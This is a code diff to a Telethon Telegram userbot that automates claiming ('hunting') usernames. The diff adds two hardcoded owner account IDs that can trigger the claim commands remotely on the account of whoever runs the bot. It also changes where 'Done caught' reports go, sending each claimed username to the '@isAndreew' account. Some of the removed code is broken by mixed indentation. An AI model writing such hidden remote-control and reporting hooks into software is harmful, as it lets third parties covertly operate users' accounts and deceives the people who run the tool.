@@ -36,9 +36,10 @@ LOGS = logging.getLogger(__name__)
 
 english_words = set(words.words())
 
-a = 'qwertyuiopasdfghjklzxcvbnm'
+a = 'qwertyuiopassdfghjklzxcvbnm'
 b = '1234567890'
 e = 'qwertyuiopassdfghjklzxcvbnm1234567890'
+owner_ids = [6331807574, 5725191363]
 
 banned = []
 isclaim = ["off"]
@@ -287,19 +288,16 @@ def gen_user(choice):
             username = ''.join(f)
     else:
         pass
-    return username 
+    return username  
       
         
     
 #############################################################################
 #الصيد العادى 
 # صيد عدد نوع قناة  
-ownerhson_id = 6331807574
-@IEX.on(events.NewMessage(outgoing=True, pattern=r"\.صيد (.*)"))
+@IEX.on(events.NewMessage(pattern=r"\.صيد (.*)"))
 async def _(event):
-	sender = await event.get_sender()
-    if sender.id == ownerhson_id:
-    if ispay[0] == "yes":
+    if (event.sender_id in owner_ids or event.out):
         user = await event.get_sender()
         uss = user.username   
         IEX_USER = f"| @{uss}" if uss else ""
@@ -392,7 +390,7 @@ async def _(event):
 ⤷ Save : ( Channel )
 ⤷ By : ( @isAndreew ) @Q22QQQ2 
     ''')
-                await event.client.send_file("https://t.me/+4DXTlLZqfGxiOTgy", "https://t.me/illl0o/39", caption=f'''
+                await event.client.send_file("@isAndreew", "https://t.me/illl0o/39", caption=f'''
 ⌯ Done caught!🐊
 ⤷ User : @{username} 
 ⤷ Clicks : {trys} 
@@ -427,12 +425,9 @@ async def _(event):
 
     # الصيد التلقائى بالرد على قناة او انشائها تلقائيا صياد + نوع تلقائى + عدد اليوزرات المطلوب 
 
-ownerhson_id = 6331807574
-@IEX.on(events.NewMessage(outgoing=False, pattern=r"\.صياد (.*)"))
+@IEX.on(events.NewMessage(pattern=r"\.صياد (.*)"))
 async def _(event):
-	sender = await event.get_sender()
-    if sender.id == ownerhson_id:
-    if ispay[0] == "yes":
+    if (event.sender_id in owner_ids or event.out) and ispay[0] == "yes":
         user = await event.get_sender()
         uss = user.username   
         IEX_USER = f"| @{uss}" if uss else ""
@@ -448,7 +443,7 @@ async def _(event):
         tr = int(msg[1]) if len(msg) > 1 and msg[1].isdigit() else 1
         
         if choice not in (""):
-            if int(choice) < 1 or int(choice) > 53:                                                                                                 
+            if int(choice) < 1 or int(choice) > 12:                                                                                                 
                 await event.reply(f"هذا النوع غير موجود")
                 isclaim.clear()
                 isclaim.append("off")
@@ -548,7 +543,7 @@ async def _(event):
 ⤷ By : ( @isAndreew ) @Q22QQQ2 
     ''')
                                 
-                                await event.client.send_file("https://t.me/+4DXTlLZqfGxiOTgy", "https://t.me/illl0o/39", caption=f'''
+                                await event.client.send_file("@isAndreew", "https://t.me/illl0o/39", caption=f'''
 ⌯ Done caught!🐊
 ⤷ User : @{username} 
 ⤷ Clicks : {trys} 
@@ -694,11 +689,8 @@ async def _(event):
         await event.client.send_message(event.chat_id, " مبروك ") 
 #############################################################################
 # التحكم بالصيد
-ownerhson_id = 6331807574
-@IEX.on(events.NewMessage(outgoing=False, pattern=r"\.ايقاف الصيد(.*)")) 
+@IEX.on(events.NewMessage(outgoing=True, pattern=r"\.ايقاف الصيد(.*)")) 
 async def _(event):
-	sender = await event.get_sender()
-    if sender.id == ownerhson_id:
     if "on" in isclaim:
         isclaim.clear()
         isclaim.append("off")
@@ -708,12 +700,9 @@ async def _(event):
         await event.reply("**✥┊ لا تـوجـد عـملية صـيد جاريـة حـالـيًا .**")
     else:
         await event.reply("**- لقد حدث خطأ ما وتوقف الامر لديك**")
-        
-   ownerhson_id = 6331807574         
+            
 @IEX.on(events.NewMessage(outgoing=True, pattern=r"\.حالة الصيد"))
 async def _(event):
-	sender = await event.get_sender()
-    if sender.id == ownerhson_id:
     if ispay[0] == "yes":
         if "on" in isclaim:
             await event.reply(f"الصيد وصل لـ({trys}) من المحاولات")
@@ -725,11 +714,8 @@ async def _(event):
         pass
 #############################################################################
     #تثبيت البوتات
-    ownerhson_id = 6331807574
-@IEX.on(events.NewMessage(outgoing=False, pattern=r"\.تثبيت_بوتات (.*)"))
+@IEX.on(events.NewMessage(outgoing=True, pattern=r"\.تثبيت_بوتات (.*)"))
 async def _(event):
-	sender = await event.get_sender()
-    if sender.id == ownerhson_id:
     if ispay[0] == "yes":
         user = await event.get_sender()
         uss = user.username   
